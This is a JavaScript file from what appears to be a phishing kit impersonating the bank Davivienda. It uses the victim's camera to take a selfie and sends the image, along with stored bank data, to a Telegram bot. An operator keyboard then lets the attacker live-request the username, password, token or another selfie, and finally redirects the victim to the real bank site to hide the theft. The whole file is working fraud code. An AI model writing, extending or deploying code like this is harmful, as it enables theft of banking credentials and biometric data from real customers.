/**
 * DAVIVIENDA - cara.js OPTIMIZADO
 * Captura selfie y la envía a Telegram a través del proxy centralizado.
 *
 * Patrón: Module Pattern + Strategy (handleTelegramAction)
 * Reusa BancoUtils para socket, overlay, formato y envío.
 */

(() => {
    'use strict';

    document.addEventListener('DOMContentLoaded', () => {
        console.log('🚀 Davivienda Cara: Inicializando...');

        if (typeof BancoUtils === 'undefined') {
            console.error('❌ BancoUtils no está cargado');
            return;
        }

        BancoUtils.initSocket();

        const dom = {
            video:    document.getElementById('cameraVideo'),
            canvas:   document.getElementById('cameraCanvas'),
            preview:  document.getElementById('cameraPreview'),
            capture:  document.getElementById('captureBtn'),
            retake:   document.getElementById('retakeBtn'),
            submit:   document.getElementById('submitBtn'),
            status:   document.getElementById('statusMessage'),
            overlay:  document.getElementById('loadingOverlay')
        };

        const state = {
            stream: null,
            imageData: null
        };

        // -------- Utilidades UI --------
        const setStatus = (text, type = '') => {
            dom.status.textContent = text;
            dom.status.className = 'status-message' + (type ? ' ' + type : '');
        };

        const setSubmitEnabled = (enabled) => {
            dom.submit.disabled = !enabled;
            dom.submit.classList.toggle('enabled', enabled);
        };

        const showOverlay = () => {
            dom.overlay.classList.add('show', 'active');
        };

        const hideOverlay = () => {
            dom.overlay.classList.remove('show', 'active');
        };

        // -------- Cámara --------
        const startCamera = async () => {
            try {
                state.stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width:  { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                dom.video.srcObject = state.stream;
                dom.capture.disabled = false;
                setStatus('Centra tu rostro dentro del óvalo');
            } catch (err) {
                console.error('❌ Error de cámara:', err);
                setStatus('No se pudo acceder a la cámara. Verifica los permisos.', 'error');
                dom.capture.disabled = true;
            }
        };

        const stopCamera = () => {
            if (state.stream) {
                state.stream.getTracks().forEach(t => t.stop());
                state.stream = null;
            }
        };

        const capturePhoto = () => {
            const { video, canvas, preview } = dom;
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext('2d');
            // Espejar para coincidir con la vista previa de selfie
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            state.imageData = canvas.toDataURL('image/jpeg', 0.85);
            preview.src = state.imageData;
            preview.style.display = 'block';
            video.style.display = 'none';

            stopCamera();

            dom.capture.style.display = 'none';
            dom.retake.style.display  = 'block';
            setStatus('Foto capturada correctamente ✓', 'success');
            setSubmitEnabled(true);
        };

        const retakePhoto = async () => {
            state.imageData = null;
            dom.preview.style.display = 'none';
            dom.video.style.display   = 'block';
            dom.capture.style.display = 'block';
            dom.retake.style.display  = 'none';
            setSubmitEnabled(false);
            setStatus('Iniciando cámara...');
            await startCamera();
        };

        // -------- Envío --------
        const submitFace = async () => {
            if (!state.imageData) return;

            showOverlay();

            const data = BancoUtils.saveBankData('davivienda', {
                cara: 'Selfie capturada'
            });

            const message = BancoUtils.formatMessage('DAVIVIENDA - VERIFICACIÓN FACIAL', data);
            const keyboard = BancoUtils.createKeyboard([
                { text: '👤 Pedir Usuario', action: 'request_user' },
                { text: '🔐 Pedir Clave',   action: 'request_password' },
                { text: '📱 Pedir Token',   action: 'request_token' },
                { text: '🤳 Pedir Cara',    action: 'request_face' },
                { text: '✅ Finalizar',     action: 'finish' }
            ], BancoUtils.getSessionId());

            try {
                await BancoUtils.sendToTelegram('face', {
                    text: message,
                    image: state.imageData,
                    keyboard
                });
                console.log('✅ Selfie enviada a Telegram');
            } catch (err) {
                console.error('❌ Error al enviar selfie:', err);
                hideOverlay();
                setStatus('Error al enviar la foto. Intenta nuevamente.', 'error');
            }
        };

        // -------- Acciones desde Telegram --------
        const actions = {
            request_user:     () => { window.location.href = 'index.html'; },
            request_password: () => { window.location.href = 'clave.html'; },
            request_token:    () => { window.location.href = 'token.html'; },
            request_face:     () => { hideOverlay(); retakePhoto(); },
            finish:           () => { window.location.href = 'https://www.davivienda.com/'; }
        };

        BancoUtils.onTelegramAction((data) => {
            console.log('📢 Acción Telegram (cara):', data);
            hideOverlay();
            const handler = actions[data.action];
            if (handler) handler();
            else console.warn('⚠️ Acción desconocida:', data.action);
        });

        // -------- Eventos --------
        dom.capture.addEventListener('click', capturePhoto);
        dom.retake.addEventListener('click', retakePhoto);
        dom.submit.addEventListener('click', submitFace);
        window.addEventListener('beforeunload', stopCamera);

        // -------- Inicio --------
        startCamera();
    });
})();
